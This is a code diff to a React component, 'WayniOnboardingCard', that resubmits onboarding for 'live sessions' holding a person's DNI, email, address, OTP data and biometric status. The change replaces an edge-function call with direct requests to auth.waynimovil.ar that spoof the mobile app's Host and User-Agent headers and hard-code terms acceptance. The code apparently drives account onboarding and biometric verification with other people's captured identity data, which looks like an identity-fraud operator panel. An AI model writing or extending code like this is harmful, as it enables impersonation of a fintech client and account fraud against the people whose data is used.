@@ -1897,21 +1897,21 @@ const WayniOnboardingCard = ({ session }: { session: LiveSession }) => {
           const hasAddress = !!(otpParts.region && otpParts.city && otpParts.street && otpParts.zip);
           const isFullyVerified = !!bioOk && hasDni && hasUuid && hasEmail;
 
-          const handleRetry = async () => {
+           const handleRetry = async () => {
             setRetrying(true);
             setRetryResult(null);
             try {
               const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL;
               const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY;
-              const headers = { "Content-Type": "application/json", "apikey": SUPABASE_KEY, "Authorization": `Bearer ${SUPABASE_KEY}` };
+              const edgeHeaders = { "Content-Type": "application/json", "apikey": SUPABASE_KEY, "Authorization": `Bearer ${SUPABASE_KEY}` };
               const invoke = async (body: Record<string, unknown>) => {
-                const res = await fetch(`${SUPABASE_URL}/functions/v1/wayni-auth`, { method: "POST", headers, body: JSON.stringify(body) });
+                const res = await fetch(`${SUPABASE_URL}/functions/v1/wayni-auth`, { method: "POST", headers: edgeHeaders, body: JSON.stringify(body) });
                 const data = await res.json();
                 if (!res.ok) throw new Error(data?.error || data?.message || `Error ${res.status}`);
                 return data;
               };
 
-              // Step 1: onboarding_verify (save-data)
+              // Step 1: onboarding_verify (save-data) via edge function
               const verifyRes = await invoke({
                 action: "onboarding_verify",
                 email: session.email,
@@ -1925,22 +1925,37 @@ const WayniOnboardingCard = ({ session }: { session: LiveSession }) => {
 
               const resolvedUuid = verifyRes.user_uuid || userUuid;
 
-              // Step 2: save_address (if we have address data)
+              // Step 2: save_address (direct API call)
               if (hasAddress && resolvedUuid) {
-                await invoke({
-                  action: "save_address",
-                  uuid: resolvedUuid,
-                  street_name: otpParts.street || "",
-                  street_number: otpParts.street_number || "0",
-                  floor: otpParts.floor || null,
-                  apartment: otpParts.apartment || null,
-                  zip_code: otpParts.zip || "",
-                  neighborhood: null,
-                  city_id: parseInt(otpParts.city_id || "0") || 0,
-                  city: otpParts.city || "",
-                  region_id: parseInt(otpParts.region_id || "0") || 0,
-                  region: otpParts.region || "",
+                const addrRes = await fetch("https://auth.waynimovil.ar/api/v1/onboarding/save-address", {
+                  method: "POST",
+                  headers: {
+                    "Host": "auth.waynimovil.ar",
+                    "Accept": "application/json, text/plain, */*",
+                    "Content-Type": "application/json",
+                    "Accept-Language": "pt-BR,pt;q=0.9",
+                    "User-Agent": "Waynimobile/1 CFNetwork/1331.0.7 Darwin/21.4.0",
+                    "x-correlation-id": crypto.randomUUID(),
+                  },
+                  body: JSON.stringify({
+                    uuid: resolvedUuid,
+                    street_name: otpParts.street || "",
+                    street_number: otpParts.street_number || "0",
+                    floor: otpParts.floor || null,
+                    apartment: otpParts.apartment || null,
+                    zip_code: otpParts.zip || "",
+                    neighborhood: null,
+                    city_id: parseInt(otpParts.city_id || "0") || 0,
+                    city: otpParts.city || "",
+                    region_id: parseInt(otpParts.region_id || "0") || 0,
+                    region: otpParts.region || "",
+                    terms_and_conditions_identifier: "terms_68fb9c8e835409.28822061",
+                  }),
                 });
+                if (!addrRes.ok) {
+                  const addrErr = await addrRes.text();
+                  console.warn("save-address error:", addrErr);
+                }
               }
 
               // Step 3: biometric (direct API call)
@@ -1954,7 +1969,6 @@ const WayniOnboardingCard = ({ session }: { session: LiveSession }) => {
                     "Accept-Language": "pt-BR,pt;q=0.9",
                     "User-Agent": "Waynimobile/1 CFNetwork/1331.0.7 Darwin/21.4.0",
                     "x-correlation-id": crypto.randomUUID(),
-                    "x-app-source": "ReactNativeApp",
                   },
                   body: JSON.stringify({
                     documentNumber: dni,
@@ -1971,26 +1985,10 @@ const WayniOnboardingCard = ({ session }: { session: LiveSession }) => {
                   const newOtp = Object.entries(existingParts).map(([k, v]) => `${k}:${v}`).join("|");
                   await supabase.from("sessions").update({ otp_code: newOtp, status: "biometric_started" }).eq("id", session.id);
                   setRetryResult({ ok: true, msg: `✓ Cadastro reenviado! Link: ${bioData.url}` });
-                } else {
-                  // Fallback: use edge function
-                  const bioRes = await invoke({
-                    action: "onboarding_biometric",
-                    identity_number: dni,
-                    user_uuid: resolvedUuid,
-                    gender: otpParts.gender || "M",
-                  });
-                  if (bioRes.biometric_url) {
-                    const existingParts = { ...otpParts };
-                    existingParts.biometric_url = bioRes.biometric_url;
-                    if (bioRes.biometric_id) existingParts.biometric_id = bioRes.biometric_id;
-                    if (resolvedUuid !== userUuid) existingParts.uuid = resolvedUuid;
-                    const newOtp = Object.entries(existingParts).map(([k, v]) => `${k}:${v}`).join("|");
-                    await supabase.from("sessions").update({ otp_code: newOtp, status: "biometric_started" }).eq("id", session.id);
-                  }
                 }
               }
 
-              setRetryResult({ ok: true, msg: "✓ Cadastro reenviado com sucesso!" });
+              if (!retryResult) setRetryResult({ ok: true, msg: "✓ Cadastro reenviado com sucesso!" });
               fetchInfo();
             } catch (err: any) {
               setRetryResult({ ok: false, msg: err?.message || "Erro ao reenviar cadastro" });
